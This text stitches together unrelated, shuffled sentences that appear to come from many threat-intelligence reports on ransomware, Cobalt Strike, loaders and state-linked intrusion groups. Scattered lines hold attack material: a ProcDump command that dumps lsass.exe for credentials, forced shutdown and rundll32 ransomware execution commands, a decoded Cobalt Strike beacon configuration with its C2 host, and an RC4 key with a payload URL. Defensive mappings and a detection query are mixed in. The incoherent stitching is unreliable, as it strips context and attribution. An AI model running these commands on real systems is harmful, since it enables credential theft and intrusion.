Using our toy example, let’s see how an adversary could break the collision-resistance of the hash function if they knew the discrete logarithm of one of the generators with respect to the other one.\n
Closer analysis reveals an element of pragmatism in that the threat actors use modified publicly available code to achieve their goals. 
The first way it does so is through a C&C command that takes a picture using connected camera peripherals.
Using the method described above, our researchers downloaded files with ID Nos. 1-18.
First, a public and private key pair will be generated using the code from this Curve25519 repository (session_public_1 and session_private_1).
These code chunks are taken from already existing code in the target application and chained together to resemble the desired attacker payload or to just disable DEP on a per page basis to allow the existing code payloads to run. 
Within just two years of activity, the threat actors behind the ransomware are proving their hunger for prolificacy, expanding their business model with a RaaS affiliate program and maintaining several platforms to announce victims and expose stolen data. 
Chinese state-sponsored cyber actors have been routinely observed using a VPS as an encrypted proxy.
Blackface,Breathing rundll32.exe OximeLied,Hostage rundll32.exe Conservatory,Piggins 
Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.
This variant was distributed by TA581 and one unattributed threat activity cluster which acted as initial access facilitators.
This technique has grown in use as threat actors look to evade Mark-of-the-Web controls. 
Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and dropped ransom notes. 
Figure 27: Functions that have been removed within the Forked Bot. 
D:\max\eyewear.bat ➝ xcopy /s /i
The purpose of waiting for the Ransomware process to finish is to ensure that all files have been encrypted before proceeding to the next steps of the ransomware attack. 
The implementation of the ReconShark variant we observed in this activity remains the same as the one covered in our previous post on Kimsuky activity, with the main distinction being the use of a different C2 server: staradvertiser[.]store.
A portion of the group’s attack toolset and underlying infrastructure was thoroughly described by fellow ESET researchers in their detailed technical paper on the MQsTTang backdoor.
In the article where Proofpoint described the IcedID Lite Loader being dropped via Emotet infections, researchers documented the structure of the botpack format and how to decrypt it as well.
MS17-010.BThis is a Python scanner (compiled with PyInstaller) for the vulnerability MS17-010 (EternalBlue). 
This leads to the opening of an Internet Explorer window with the file download prompt. 
OnTime function commonly used to schedule the execution of a specific VBA procedure instead of directly calling it.
They then repeated the install of the remote access software package. 
Among the many “clipboard” logs observed, "Client.exe -bomb," stood out.
By using this file format, the attackers are trying to bypass malspam detection technologies that usually focus on detecting file types more commonly used in malware infection chains (e.g., EXE and DLL files, MS Office files). 
[T1112], Disable or Modify Tools [T1562.001], Disable or Modify System Firewall
The content of the payload is mapped into the new process using low level APIs: NtCreateSection, NtMapViewOfSection.
When opened, it displays an image instructing the user to enable Word’s macro code execution to reveal information supposedly protected by M.E. Doc (My Electronic Document).
It’s worth mentioning that some of these modules can create a named pipe with a GUID-formatted name derived from the module’s ID.
The threat actor then tried again on a different server using a DLL this time: rundll32 locker_32.dll,run /[email protected] Again, only execution on the server was observed.
4864f84ea0f6939751310a2cca43e71a57171f37679cb7853d29a083b1617a09 .zip 
Details of the certificate of the vulnerable driver (top) and Enigma Driver (bottom) Stage 3: EngimaDownloader_s003 The following table shows the details of Enigma.Bot.Net.exe. 
"C:\windows\file2.bat" /f shutdown -r -f
JavaScript code The main website hosted at https[://]www.nknews[.]pro redirects to the legitimate NK News site, https://nknews.org, and uses a certificate issued by Sectigo: Thumbprint: a1597d197e9b084a043ada5c7dac1f9b6d7f7af3 
Lastly, a detection should be in place to promptly review anomalous RDP connections to deconflict them with approved system administration activity. 
[T1562.002], Obfuscated Files or Information [T1027], Clear Windows Event Logs
There are only a few small tweaks between the original function in Apostle and the Fantasy implementation. 
IBM X-Force assesses with high confidence that individuals and organizations holding strategic, political, or military information in connection with the Korean peninsula will see elevated threats from the DPRK, given ITG10’s previous and recent activity. 
[T1105].
According to our data from early 2021 up to now, Amazon Cloudfront takes the lead on preferable CDN used by threat actors, by a large margin. 
To start, the key is initialized with 0xD508.
Trigona ransomware has been linked to compromises impacting multiple organizations worldwide, in sectors including manufacturing, finance, construction, agriculture, marketing and high technology.
title: Dead or Alive?
Windows ServiceModPipe can create a new service for persistence. 
[D3-PHDURA] Process Analysis Process Spawn Analysis Process Lineage Analysis [D3-PLA] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Create or Modify System Process
SmadAV evasion At the beginning of its execution, the malware starts a function called bypassSMADAV, whose purpose is to bypass the Indonesian antivirus Smadav.
We also noted that this update includes a more sophisticated encryption method of byte remapping and a monthly change in command-and- control (C&C) server.
The team used third-party owned and operated infrastructure throughout their assessment for C2. 
In doing so, they are able to compute point multiplications in a more efficient way, though special care needs to be taken to ensure the resulting encoding function is injective, as discussed in the previous section.\n
Among other reasons, the structure of the .NET Wrapper module in image.jpg, and much of the cleanup script a.bat, is nearly identical. 
If the new process is not created with a DEBUG_PROCESS or a DEBUG_ONLY_THIS_PROCESS flag, the hooked process creation function clears a possible hook of the NtQueueAPCThread function and then uses it to create an APC procedure in the new process.
Finally, the two malicious versions of the ffmpeg.dll bundled in the affected 3CXapplication are flagged by their hashes as being of low reputation. 
The actors used Mimikatz to create a rogue domain administrator account. 
Like regular developers, malware authors often make configuration mistakes when setting up infrastructure.
The Communicator module which sends data to the C2 server and receives replies The Hider The Hider is the first launched component of the Backdoor.
[MITRE ATT&CK] Dynamic Data Exchange (T1173) |
The backdoor uses domain fronting to obfuscate its true C2 server.
They also create a copy of the NTDS.dit and SYSTEM-registry hive file for new credentials to crack. Discovery (TA0007) 
In our case, the SMB Beacon is communicating over the network with a parent Beacon using named pipes.
The Post-Validator The Post-Validator is a DLL obfuscated with VMProtect.
Create a deny list of known compromised credentials and prevent users from using known-compromised passwords. 
The control code that injects r77 into all processes that are not yet injected. 
If the infected file requires specific libraries that are not part of the operating system (OS), then chances are it’s not going to detonate inside a malware analysis sandbox because these dependencies likely won’t be preinstalled in the environment.
CaptureThe attackers have used various RATs that can capture audio from the system’s microphone. 
It is even signed with an invalid portal.office.com certificate (Figure 6). 
Table 4: Hive Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use External Remote Services T1133 Hive actors gain access to victim networks by using single factor logins via RDP, VPN, and other remote network connection protocols. 
This data includes the following: Preferred TLS version Supported cipher suites 32 bytes of random data used in the key generation algorithm A data signature, in the case of an ephemeral elliptic-curve Diffie-Hellman (ECDHE) key exchange An example of an ECDHE “Server Hello” message is shown in Figure 6. Figure 6.
Additional Resources Acknowledgements We would like to thank Simon Conant for his help with sample collection, and malware and infrastructure analysis. 
Figure 19 Malicious content A closer look at the document reveals the graphical elements are all images placed in a layered style by the malicious actor.
After successfully decrypting the C2 URLs, the data is sent there using a HTTP POST request adding the constructed query string as data.
ReadWrite Shift.
C:\Windows\system32\cmd.exe /C
Older and outdated PIN pad devices use obsolete and weak cryptography schemes, making it easy for malware to install a USB or serial port sniffer to capture and decrypt the traffic between the PIN pad and the infected system.
[fuvataren.com ,www.fuvataren.com ]Public Algorithm: rsaEncryption Below is the Cobalt Strike configuration of this C2 exported from a sandbox analysis results: access_type: 512 beacon_type: 2048 host: fuvataren.com,/rs.js http_header1: AAAAEAAAABBIb3N0OiBhbWF6b24uY29tAAAACgAAABFDb25uZWN0aW9uOiBjbG9zZQAAAAoAAAASQWNjZXB0OiBpbWFnZS9qcGVnAAAABwAAAAAAAAALAAAAAwAAAAIAAAAFSFNJRD0AAAAGAAAABkNvb2tpZQAAAAkAAAAJcmVhZD10cnVlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= http_header2: AAAAEAAAABBIb3N0OiBhbWF6b24uY29tAAAACgAAABFDb25uZWN0aW9uOiBjbG9zZQAAAAoAAAAVQWNjZXB0LUVuY29kaW5nOiBnemlwAAAACgAAAC9Db250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZAAAAAcAAAABAAAADQAAAAMAAAACAAAAB3ZhbHVlcz0AAAAEAAAABwAAAAAAAAADAAAAAgAAAA5fX3Nlc3Npb25fX2lkPQAAAAYAAAAGQ29va2llAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= http_method1: GET http_method2: POST jitter: 6144 polling_time: 5000 port_number: 443 sc_process32: %windir%\syswow64\rundll32.exe sc_process64:
Example registry entry showing target O365 email accounts The same WSMan connection string was also located in the user’s NTUSER.DAT registry hive under the path: Figure 7.
Within McAfee, attribution is not our main focus, protecting our customers is our priority.
An original file handle can be correlated to a compromise and inconsistencies between file timestamps and previous handles opened to them can be a detection rule. 
Using the Windows Azure Active Directory PowerShell Module, the threat actor connected to the victim’s O365 tenant and began performing enumeration queries.
Consider soliciting support from a third-party incident response organization that can provide subject matter expertise to ensure the actor is eradicated from the network and to avoid residual issues that could enable follow-on exploitation. 
Our investigation of the 3CX campaign is still far from complete.
Frequently, these have been referred to by their extension (e.g., .DREAM, .Nutella, .NARCO, .LEGO).
Do not expose services and protocols (such as File Transfer Protocol
Unfortunately, this check only applies when a user is changing their password via the “password change” method — but if a “password reset” is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a user’s account object.12 Since the Get-ADReplAccount cmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value. 
Table of Contents Dependency EmulationExample File InfectorMitigating the Dependency ProblemVMI SSL/TLS DecryptionTLS HandshakesExample SSL Decryption With WiresharkConclusionIndicators of Compromise Dependency Emulation In the context of malware execution, we talk a lot about dependencies.
Put breakpoints on VirtualAlloc and VirtualProtect. 
In a few weeks, we’ll have another Emotet report out from June, where the intrusion used similar TTPs and ended in ransomware. 
This is because many other legitimate servers on the internet use this version of Java to operate their web applications. 
Investigation of the network infrastructure provides yet another piece of confirmation of the relationship between Paranoid PlugX and Winnti. 
Furthermore, the configuration file will be deleted once it is loaded into memory for fear of leaking network infrastructures. 
The locker_64.exe file was then renamed to 64.exe and executed using the text file in the command arguments: 64.exe /[email protected] The threat actors attempted to execute the malware across all hosts in the target list, but only execution on the backup server was observed. 
That seems to be the one-million-dollar question to be asked.
While historically IcedID’s main function was a banking trojan, the removal of banking functionality aligns with the overall landscape shift away from banking malware and an increasing focus on being a loader for follow-on infections, including ransomware. 
From it’s lack of a valid code-signing signature to its ignorance of TCC and other macOS file-system protections as it stands it poses no threat to macOS users. 
See MAR 10387061-1.v1 for additional information, including IOCs, on these four files. 
T1218.011.
The file with a .z extension is the exfiltrated data blob and the file with a .zip extension is the logging file. 
Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload. 
Credential AccessT1555.003Credentials from Password Stores: Credentials from Web BrowsersDolphin can obtain saved passwords from browsers. 
WatchDog infrastructure replacement.
At first, the advent of CET painted a bleak picture future for exploit developers and their reliance on ROP-based techniques.
This is the most likely avenue by which such threat actors gained access to compromised LATAM government networks.
OOXML files are essentially packaged ZIP archives that consist of multiple XML files called parts.
Get functions from module, e.g. using a CRC32 hash If the malware fails to get a function, it will go to a “sleep” call and terminate itself. 
It checks running processes for executables of several known cybersecurity vendors.
RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33 Restored URL: hxxps://docs.azure-protection[.]cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a command line parameter.
It decrypts AddSecurityPackage64.dll and pc.dll, stores pc.dll on the file system, and then loads and executes AddSecurityPackage64.dll by invoking its exported function, pathAddPackage. 
Instead, Importlib, the implementation of import in Python source code portable to any Python interpreter, is used to avoid detection by security tools.
SOCRadar SOC Tools provided by SOCRadar Labs MITRE ATT&CK Techniques Techniques ID Reconnaissance Gather Victim Identity Information: Email Addresses T1589.002 Resource Development Acquire Infrastructure: Web Services T1583.006 Obtain Capabilities: Tool T1588.002 Initial Access Phishing:
The shellcode looks for 0x4d 0x5a and 0x50 0x45 bytes that denote the “MZ" and “PE” headers of a Windows PE executable file to locate the payload in memory.
This is a classic BlueNoroff strategy to persuade the victim to execute the malicious shortcut file to acquire the decoy document’s password.
With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.
This campaign can be detected in Microsoft Defender Antivirus, built into Windows and on by default, as well as Microsoft 365 Defender. 
[19:32:07][6140964864][+] End file /Users/user/Downloads/lock_me_up/DazzleSpy.zip size 223464 time 1672883981 is encrypted.
It then starts communication with C2 servers specified in its configuration, sending heartbeat messages with 15-minute intervals.
TA0002 : Execution T1053: Scheduled Task/Job T1053.005:
The red team sent tailored spearphishing emails to seven targets using commercially available email platforms [T1585.002].
The toy example in the Definition section also illustrated how hashing messages larger than the expected size may lead to collisions.\n
After that, we’ll examine network data associated with lateral movement and the various methods employed by Cobalt Strike operators based on our observations. 
The packed file contains three main components: packed content, a new PE header, and a stub, as seen in the image below: Packed sample view. 
This ensures that the driver doesn’t interfere in a way that could be noticeable by the user.
These roughly follow an internal naming convention where classes with names ending with manager_handler perform actions in response to C&C commands, while those whose names end with manager automatically perform actions based on timers or event listeners. 
Enabling firewall customers to identify activity to malicious domains SELECT timestamp, log_component, log_subtype, user_name, user_group, app_name, src_ip, src_port, protocol, dst_ip, dst_port, http_category, url, domain, http_user_agent, http_status FROM xgfw_data WHERE LOWER(log_component) = 'http' AND (LOWER(domain) = 'akamaicontainer.com' OR LOWER(domain) = 'akamaitechcloudservices.com' OR LOWER(domain) = 'azuredeploystore.com' OR LOWER(domain) = 'azureonlinecloud.com' OR LOWER(domain) = 'azureonlinestorage.com' OR LOWER(domain) = 'dunamistrd.com' OR LOWER(domain) = 'glcloudservice.com' OR LOWER(domain) = 'journalide.org' OR LOWER(domain) = 'msedgepackageinfo.com' OR LOWER(domain) = 'msstorageazure.com' OR LOWER(domain) = 'msstorageboxes.com' OR LOWER(domain) = 'officeaddons.com' OR LOWER(domain) = 'officestoragebox.com' OR LOWER(domain) = 'pbxcloudeservices.com' OR LOWER(domain) = 'pbxphonenetwork.com' OR LOWER(domain) = 'pbxsources.com' OR LOWER(domain) = 'qwepoi123098.com' OR LOWER(domain) = 'sbmsa.wiki' OR LOWER(domain) = 'sourceslabs.com' OR LOWER(domain) = 'visualstudiofactory.com' OR LOWER(domain) = 'zacharryblogs.com' OR (LOWER(domain) LIKE '%raw.githubusercontent.com%' AND LOWER(url) LIKE '%/iconstorages/images/main/%')) 
The code that generates these files is shown in Figure 23. Figure 23.
Event ID [1149] - RDP connection established Event ID
Crontab entry for GoldMax persistence Enumeration Tools/Unique Directory Structure Throughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit.
In one instance, we observed one of the emails titled “Multa de Trânsito,“ which translates from Portuguese as “traffic infraction ticket.”
The variant was named Raindrop by Symantec.
Next, PowerShell contacts two shortened links, which lead to two files hosted on softmedal[.]com (a file/image sharing site). 
Avoid using SMS as an MFA vector to avoid the risk of SIM swapping.
IsaacWiper identifies all the physical drives not containing the Operative System and locks their logical partitions by only allowing a single thread to access each of them.
Comparing the properties of the malicious file (left), and properties of the legitimate Youdu installer (right) 
Create Account: Local Account [T1136.001] Account Manipulation [T1098] Intrusion Detection or Prevention Systems Endpoint Protection Platform Web Proxy Logs Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan None Local Admin User Account Creation (server) Create a local administrator account on a target server system. 
In contrast to the current one, the version from February contained a malicious component in the form of a DLL.
Below is a screenshot of how the master key can be extracted by using the credential dumping tool. 
In addition to the use of similar wording, both notes employed the same format of a 16-byte hexadecimal string for the UID. Figure 2.
+ position_array[xxZmgLbpuJ])
Hardcoded JSON format keys and values. 
If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. 
The other header data is used for decryption: a 32-byte key is located at offset 0x28 and a 12-byte nonce for the ChaCha20 algorithm is at offset 0x50. 
Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.
Account Manipulation Trigona operators compromise administrator accounts and use them to conduct malicious activities, such as executing NetScan. 
During conversations with targeted individuals, Kimsuky also seizes any available opportunity to distribute password-protected weaponized Office documents that deploy the ReconShark reconnaissance malware.
In some instances, they used Windows Management Instrumentation (WMI)
TA0008 Lateral Movement T1570.
If these vulnerabilities are left unpatched, exploitation often requires few resources and provides threat actors with easy access to victim networks.
It can collect data from a range of web browsers, as well as applications including Steam, Telegram, Discord, crypto wallets, and VPN providers. 
except: exit('[-]
| extend PermissionAddedTo = tostring(RawEventData.
GrantedAccess: 0x1010 CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9fc24|C:\Windows\System32\KERNELBASE.dll+20d0e|UNKNOWN(000002AA74CFD95C) Discovery Ursnif related discovery As we have observed in other malware, Ursnif ran a number of automated discovery commands to gain information about the environment.
F6 50 87 F4 E9 AE 11 ED 65 0D 83 E8 Kuwait Telecommunications company certificate [1] Original, legitimate driver’s MD5 is 015caeec9148194054b5b1de64762a43 
In almost every attack, the destination port is customizable, and threat actors who purchase the malware can modify the attack according to their target. 
TA0009 Collection T1560.001.
Its feature set expanded over the years to include various surveillance, persistence, and information-stealing capabilities:taking full control of the infected machinerecording keystrokes in real time with offline logging availableaccessing live web cam feeds including microphone recordingdownloading files remotelyremote shutdown and rebootdisabling user inputOver
Targeting We identified one gambling company in the Philippines as compromised by this campaign.
Replicating the hashing function implementation allows us to retrieve the corresponding APIs in the appropriate library.
In this case, the wiper was used with the purpose of slowing down the recovery process from the Industroyer2 attack and gaining back control of the ICS consoles, as well as covering the tracks of the attack.
They created a file (2.txt) and populated it with a list of hosts they had uncovered during their discovery activity.
The sample is loaded by a loader written in Delphi, which downloads the next stage from a public file storage service using HTTPS. 
After enumerating subdomains of the associated victim network, the threat actor uses automated vulnerability scanning tools including Nuclei and Afrog to identify potentially exploitable systems.
Remote Desktop Protocol - T1021.001 Windows Management Instrumentation - T1047 Domain Account - T1087.002 Process Injection - T1055 Asynchronous Procedure Call - T1055.004 Registry Run Keys / Startup Folder - T1547.001 Remote Access Software - T1219 Web Protocols - T1071.001 Lateral Tool Transfer - T1570 Exfiltration Over C2 Channel - T1041 Internal case #17386 
However, based on the documentation of RES 3700 POS, the attackers should not be able to access some of the most sensitive information – such as credit card numbers and expiration dates – which is protected by encryption.
After resolving the functions, the second decryption stage occurs. 
GlobeImposter has the ability to delete volume shadow copies, thereby inhibiting the recovery of data.
Figure 18.
GoBruteforcer multiscan function.
Emotet Case 14335 Reference: https://thedfirreport.com */ /*
Account discovery tool: PsLogListCommand used: psloglist.exe -accepteula -x security -s
Log in to O365 as a user with privileged access to cloud resources. 
Four out of every five Fortune 500 companies, for example, use Microsoft 365 services [1]. 
As mentioned in our previous report detailing emerging ransomware families in 2021, HelloKitty features multiple flags that could be set as command line arguments, which are detailed in Table 1 of the linked report. 
However, we can confirm that developers did install the malicious PyPI package and that their machine names, usernames, and directory listings were harvested as a result. 
It exits if the return value is commonly used in CIS countries: { 0x042b: "Armenian_Armenia", 0x042c: "Azeri_Latin", 0x043f: "Kazakh", 0x082c: "Azeri_Cyrillic", 0x419: "Russian", 0x422: "Ukrainian", 0x423: "Belarusian", 0x428: "Tajik", 0x437: "Georgian", 0x440: "Kyrgyz_Cyrillic", 0x442: "Turkmen", 0x443: "Uzbek_Latin", 0x819: "Russian_Moldava", 0x843: "Uzbek_Cyrillic" } Encryption Process The Rorschach ransomware employs a highly effective and fast hybrid-cryptography scheme, which blends the curve25519 and eSTREAM cipher hc-128 algorithms for encryption purposes.
Use a domain reputation service to detect suspicious or malicious domains.
Figure 1.
The payload was found to be a Loader with similarities to Domino Backdoor, and will be referred to as Domino Loader. 
[9] “SharpCheckInfo/README.md at master · uknowsec/SharpCheckInfo,” GitHub.
Normally, this service is intended for running %windir%\system32\cleanmgr.exe.
Figure 23.
It uses the same techniques as other OEM backdoor-like features like Computrace backdoor (a.k.a. LoJack DoubleAgent) abused by threat actors and even firmware implants such as Sednit LoJax, MosaicRegressor, Vector-EDK.
We believe the relationship found in this research could bring this notorious hacking group back to public sight and the findings here will be helpful to future research on hacker groups which are active in Southeast Asia. 
The beacon creates the named pipe (seen in Sysmon EventID 17) and impersonates the NT AUTHORITY\SYSTEM account used to connect to the pipe. 
To get started: Select an ATT&CK technique described in this advisory (see Table 3). 
Account Manipulation Added newly created accounts to the administrators' group to maintain elevated access. T1543.003.
The use of these legitimate platforms allows threat actors or adversaries to evade detections or to blend in its C2 communication with other normal network traffic so security solutions will not raise any red flags or detection alerts. 
Moreover, we’ll delve into a wide range of exciting topics, including: User-level persistence to establish long-term presence and maintain access on compromised systems. 
The dropper is executed by the user. 
For example, Event 4779 relating to a user disconnecting from a terminal session, reveals the client name of the source workstation.
Contents of electronic_resume.pdf.rarThe first file might look like bait, but trying to open it in a PDF viewer gives an error, since it is practically a copy of the latter. 
We have also encountered variations which include both email addresses.
Deriving C2 URLs from a Domain Generation Algorithm (DGA) using lists of domain names, subdomains, top-level domains (TLDs), Uniform Resource Identifiers (URIs), file names, and file extensions 6.
Figure 2.
We have explored some of the more interesting banking Trojan techniques and how they’re used to steal victims’ sensitive data.
Close Out The StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actor’s extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months — and in some cases, years. 
We were able to reproduce this flow in our lab once, but most of the time we saw Gootkit. 
Both components shared a similar name-hashing algorithm, which is outlined below, along with unique corresponding function name hashes (e.g. 0x311B83F, the name hash of ExAllocatePool) that were not seen in use elsewhere in the wild. 
This rootkit supports both x32 and x64 Windows processes and has the following features: Fileless persistence: The rootkit is stored as obfuscated data in the registry and is spawned with PowerShell via Task Scheduler to be injected into the winlogon.exe process. 
T1572
They will use several sophisticated techniques to perform internal reconnaissance and remote code execution on critical resources, which range from using legitimate operating system tools to discover network assets to using novel code execution techniques on the target.
The dist/init.php file is a part of the legitimate post-layouts plugin.
Part of the code for the mentioned operations is shown in Figure 17. Figure 17.
Uploading data in 2048-byte chunks 9.
These were used to inject the payload into process memory. 
With high confidence, we believe that the adversary was interested in stealing proprietary intelligence that could be used for military or intellectual property/manufacturing purposes. 
We believe this was to monitor the execution of the ransomware payload. 
Get the module accessing the PEB and using a CRC32 
BE7F0E41CD514561AED43B07AA9F5F0842BF876CHTra.exeWin32/HackTool.
The cookie value consists of four Dword hex values that contain information about the customized packet size using a XOR value. 
These affiliates are interviewed and vetted before being accepted into the RaaS group.
This can be seen in Figure 1 and Figure 2. Figure 1: BazarLoader Employment Termination Malspam Figure 2: BazarLoader Fake Anonymous Survey We will firstly analyze the employment termination malspam. 
Certificate compromise Another interesting part of this campaign is the fact that some of the malicious files are signed with a certificate with the following signer: “Permyakov Ivan Yurievich IP”.
This is important to note because the functionalities of Cobalt Strike’s trial version are limited.
A threat actor can use “man-in-the-disk” to get the user to download a malicious “helper application” instead, allowing the threat actor access to the device. 
Actors behind ViperSoftX take this narrative a step further by using actual non-malicious software to hide and pose as typical illegal software versions.
Unit 42 has also observed Ransom Cartel group breaching organizations, with the first known victims observed by us around January 2022 in the U.S. and France.
Monitor processes for the execution of known proxy binaries (e.g., rundll32.exe) and look for anomalous activity that does not follow historically good arguments and loaded DLLs associated with the invocation of the binary. 
It was later restored in version 3.0, but in a different form.
This blog will examine Guloader’s latest VBScript/PowerShell execution techniques in more detail. 
When it appears in addition to the use of a leak site, this practice is known as triple extortion, a tactic that was observed being used by groups like Avaddon and Suncrypt in the past. 
Later, the group continued appending encrypted files with names based on its victims, such as “.artis” for the Artis Zoo in Amsterdam.
>= 134 and pe.rich_signature.toolid(261, 29395)
History Just as its name suggests, TrueBot is a downloader trojan botnet that uses command and control servers to collect information on compromised systems and uses that compromised system as a launching point for further attacks, as seen recently with Clop Ransomware. 
T1036.004.
# Technique 3: Check if running in a sandboxed network environment sandboxed_networks =
Campaigns have utilized the same URL path */do/it.php since at least 8/20/2022, making it a reasonable path to alert. 
This requires slightly less technical knowledge but it still can be time consuming.
Companies in Europe and the U.S. were hit with ransomware much more often than companies based in other countries allegedly because of high profit and insurance and not because of language barriers. 
The ProcDump utility was executed on those workstations using the following command line: C:\programdata\procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp Kerberoasting Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected: Here is an extract of PowerShell EventID
They then exfiltrate the victim’s data via the RClone tool.
Furthermore, COOLCLIENT applies obfuscation techniques that we discuss in later sections. Figure 23.
This research project covers the fingerprinting of Cobalt Strike servers and is described in Fox-IT blog “Identifying Cobalt Strike team servers in the wild”.
Then, the loaded module is just called. 
T1574.002Hijack Execution Flow: DLL Side-LoadingThe attackers have used DLL side-loading to execute their malicious payloads. 
Persistence [TA0003] Technique Title ID Use Scheduled Task/Job: Scheduled Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence. 
In our case, the COOLCLIENT sample we analyzed had a more recent compilation time in 2022, and while it provides the same functionalities, it has the added capability to open a decoy document (work.pdf) when the current process name has “.pdf” or “.jpg” file extensions.
The encoded enumeration data is stored in a cookie called SSN.
rundll32.exe "C:\Users\REDACTED\AppData\Local\Temp\rate_x32.dat",update /i:"LaborBetray\license.dat" Discovery IcedID ran initial discovery after being executed on the beachhead.
The 127.0.01 and ADMIN$ indicates C:\Windows. 
However, it was not made for security.
This code hooks the 13h and 15h BIOS interrupts and then launches the original MBR.
Additionally, there was an unusually high volume of failed logins to the compromised account around the time of the initial access. 
The following table shows the configuration parameters in the audit event related to this change: NameValue“Name”“Test06”“SenderAddressLocation”“Header”“RemoveHeader”“ARC-Message-Signature”These modifications to the Exchange server settings allowed the threat actor to perform their primary goal in the attack: sending out spam emails.
x/s $x0 0x16fdfeb10: "hunter2" (lldb) x/s $x1 0x10005a0d2: "test At this point, armed with an decent understanding of the malware (yah, its ransomware) plus understanding of commandline options (that also allow us to enable logging), coupled with the fact that it’s a Sunday (aka the day of rest, not reversing malware) I decided to switch to passive dynamic analysis.
This host name was also in the Security events: 
All the domains were registered on 2021-03-30, and according to public data available in VirusTotal, three of them have been associated with Cobalt Strike infrastructure so far; the domain seen in this intrusion, powelin[.]com and awesents[.]com. 
The team used these platforms to create flexible and dynamic redirect servers to send traffic to the team’s Cobalt Strike servers [T1090.002].
Compromise of the OEM update infrastructure and supply chain – Gigabyte does have documentation on their website for this feature so it may be legitimate, but we cannot confirm what is happening within Gigabyte.
Rust programming has gained momentum due to its fast and high performance, powerful web application development, low overhead for embedded programming, and memory management resolution.
By implementing this persistence, the attacker can regain access to the environment if the targeted organization destroys their initial means of access.
The person advertising the RAT appeared to be an English-speaking teenager.
This was determined through a review of files found on one of the initially compromised hosts.
0x8032A0 Change the Orchestrator configuration. 
Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.
We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.
A TrojanDropper:PowerShell/Cobacis.
IOCs File IOCs: Network IOCs 
A decompilation of this ping function is shown in Figure 4. Figure 4.
Triage The (SHA-1) hash for the binary (aptly named locker_Apple_M1_64) is 9e9a5f8d86356796162cee881c843cde9eaedfb3 While we're only focusing on the macOS sample, it appears the LockBit group has built this sample for a host of other OS's: Using macOS’s file utility, we see the locker_Apple_M1_64 binary is an x86_64 (Intel) Mach-O: % file LockBit/locker_Apple_M1_64 LockBit/locker_Apple_M1_64: Mach-O 64-bit executable arm64 And what about it’s code signing information?
When byte code bites Who checks the contents of compiled Python files
Once executed, Emotet setup a Registry Run Key to maintain persistence on the beachhead host. 
The attacker also used lookalike domains in this campaign to carry out malicious activities and evade network detection.
We observed the software developer pushing out clean updates within a matter of hours of the attack.
It is evident why Cobalt Strike is used by organizations and threat actors alike because of the extensive suite of capabilities it possesses, and also due to its ability to bypass defenses.
The ransomware note sent out to the victim was formatted similarly to Yanluowang ransomware notes, although other variants dropped a note that more closely resembled DarkSide ransomware notes (causing some to mistakenly refer to it as DarkSide).
